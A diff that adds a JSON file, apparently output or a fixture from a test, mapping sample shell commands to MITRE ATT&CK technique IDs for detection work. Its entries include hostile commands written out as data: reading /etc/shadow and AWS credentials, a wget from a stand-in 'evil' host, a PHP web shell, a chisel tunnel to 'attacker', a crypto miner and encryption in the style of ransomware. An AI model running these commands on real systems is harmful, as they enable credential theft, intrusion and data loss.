@@ -1,0 +1,67 @@
+{
+  "command_mapped_count": 17,
+  "mapped": {
+    "T1003": [
+      "cat /etc/shadow"
+    ],
+    "T1021.004": [
+      "ssh root@10.0.0.5 -p 2222"
+    ],
+    "T1033": [
+      "bash -c id",
+      "whoami && id",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "cmd.exe /c whoami"
+    ],
+    "T1046": [
+      "ss -antp"
+    ],
+    "T1059.001": [
+      "powershell -enc SQBFAFgA"
+    ],
+    "T1059.003": [
+      "cmd.exe /c whoami"
+    ],
+    "T1059.004": [
+      "bash -c id",
+      "python3 -c 'print(1)'",
+      "perl -e 'print 1'"
+    ],
+    "T1082": [
+      "uname -a",
+      "cat /etc/os-release",
+      "ps aux"
+    ],
+    "T1090": [
+      "chisel client attacker:9000 R:socks"
+    ],
+    "T1105": [
+      "wget http://evil/bot.sh"
+    ],
+    "T1222": [
+      "chmod 777 bot.sh",
+      "chown root:root bot.sh"
+    ],
+    "T1486": [
+      "openssl enc -aes-256-cbc -in data -out data.locked"
+    ],
+    "T1496": [
+      "./xmrig --config x"
+    ],
+    "T1505.003": [
+      "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php"
+    ],
+    "T1543.002": [
+      "systemctl enable bot.service"
+    ],
+    "T1555": [
+      "cat /root/.aws/credentials"
+    ],
+    "T1562": [
+      "iptables -F INPUT"
+    ]
+  },
+  "pass": true,
+  "technique_catalog_count": 20
+}
